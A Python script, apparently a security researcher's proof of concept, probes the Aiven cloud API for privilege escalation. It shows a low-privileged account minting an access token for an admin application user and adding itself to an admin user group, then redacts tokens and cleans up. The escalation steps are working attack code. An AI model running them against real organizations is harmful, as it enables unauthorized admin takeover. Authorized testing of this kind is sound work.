#!/usr/bin/env python3
"""Aiven run 7c: A2 proof-of-power + groups retest."""
import json
import os
import re
import sys
import urllib.request
import urllib.error

BASE = "https://api.aiven.io/v1"
T1 = os.environ.get("AIVEN_TOKEN_1", "")
T2 = os.environ.get("AIVEN_TOKEN_2", "")
if not T1 or not T2:
    print("tokens missing", flush=True)
    sys.exit(2)

ORG = "org5eea5b7d496"
A1 = "a5eea5b45dff"
os.makedirs("outputs", exist_ok=True)
CALLS = []


def req(method, path, token, body=None):
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(
        BASE + path, data=data, method=method,
        headers={"Authorization": f"aivenv1 {token}",
                 "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(r, timeout=30) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, f"ERROR {e}"[:200]


def call(who, method, path, token, body=None, keep=600):
    status, resp = req(method, path, token, body)
    safe = re.sub(r'"full_token"\s*:\s*"[^"]+"', '"full_token":"<redacted>"',
                  resp[:keep])
    CALLS.append({"who": who, "method": method, "path": path,
                  "status": status, "len": len(resp), "body": safe})
    print(f"{who} {method} {path} -> {status} ({len(resp)}B)", flush=True)
    return status, resp


def field(text, *names):
    for n in names:
        m = re.search(rf'"{n}"\s*:\s*"([^"]+)"', text or "")
        if m:
            return m.group(1)
    return None


def grant(pid, ptype, perms):
    return call("T1", "PUT", f"/organization/{ORG}/permissions/organization/{ORG}",
                T1, {"permissions": [{"principal_id": pid,
                                      "principal_type": ptype,
                                      "permissions": perms}]})


def main():
    s, b = call("T1", "GET", f"/organization/{ORG}/user", T1, keep=4000)
    t2_uid = None
    try:
        for u in json.loads(b).get("users", []):
            if "account2" in ((u.get("user_info") or {}).get("user_email") or ""):
                t2_uid = u.get("user_id")
    except Exception:
        pass
    print(f"t2={t2_uid}", flush=True)

    s, b = call("T1", "POST", f"/organization/{ORG}/application-users",
                T1, {"name": "moka-priv2"})
    priv = field(b, "user_id")
    grant(priv, "user", ["role:organization:admin"])
    s, b = call("T1", "GET", f"/organization/{ORG}/user/{priv}/permissions",
                T1, keep=1200)
    print(f"PRIV effective perms body: {b[:300]}", flush=True)
    grant(t2_uid, "user", ["organization:app_users:write"])
    s, b = call("T2", "POST",
                f"/organization/{ORG}/application-users/{priv}/access-tokens",
                T2, {"description": "proof-mint"}, keep=200)
    tm = field(b, "full_token")
    print(f"minted token captured: {bool(tm)}", flush=True)
    if tm:
        call("TM", "GET", f"/account/{A1}/projects", tm)
        call("TM", "POST", f"/organization/{ORG}/application-users",
             tm, {"name": "moka-proof-app"})
        call("TM", "GET", f"/organization/{ORG}/user", tm, keep=300)

    s, b = call("T1", "POST", f"/organization/{ORG}/user-groups",
                T1, {"user_group_name": "moka-gpriv2", "description": "probe"})
    gpriv = field(b, "user_group_id")
    s, b = call("T1", "POST", f"/organization/{ORG}/user-groups",
                T1, {"user_group_name": "moka-gplain2", "description": "probe"})
    gplain = field(b, "user_group_id")
    print(f"gpriv={gpriv} gplain={gplain}", flush=True)
    if gpriv:
        grant(gpriv, "user_group", ["role:organization:admin"])
    grant(t2_uid, "user", ["organization:groups:write"])
    if gpriv:
        s, _ = call("T2", "PATCH",
                    f"/organization/{ORG}/user-groups/{gpriv}/members",
                    T2, {"member_ids": [t2_uid], "operation": "add_members"})
        print(f"T2 self-add to ADMIN group -> {s}", flush=True)
        s, b = call("T1", "GET",
                    f"/organization/{ORG}/user/{t2_uid}/permissions",
                    T1, keep=1500)
        print(f"T2 effective perms after group join: {b[:600]}", flush=True)
    if gplain:
        call("T2", "PATCH", f"/organization/{ORG}/user-groups/{gplain}/members",
             T2, {"member_ids": [t2_uid], "operation": "add_members"})

    for gid in (gpriv, gplain):
        if gid:
            call("T1", "PATCH",
                 f"/organization/{ORG}/user-groups/{gid}/members",
                 T1, {"member_ids": [t2_uid], "operation": "remove_members"})
            call("T1", "DELETE", f"/organization/{ORG}/user-groups/{gid}", T1)
    s, b = call("T1", "GET", f"/organization/{ORG}/user", T1, keep=4000)
    try:
        for u in json.loads(b).get("users", []):
            nm = (u.get("user_info") or {}).get("real_name") or ""
            if nm.startswith("moka-"):
                call("T1", "DELETE",
                     f"/organization/{ORG}/application-users/{u.get('user_id')}",
                     T1)
    except Exception as e:
        print(f"cleanup list parse failed: {e}", flush=True)
    if priv:
        call("T1", "DELETE", f"/organization/{ORG}/application-users/{priv}",
             T1)
    grant(t2_uid, "user", [])
    with open("outputs/aiven_delegation3.json", "w") as f:
        json.dump({"calls": CALLS}, f, indent=1)
    print(f"DONE calls={len(CALLS)}", flush=True)


if __name__ == "__main__":
    main()
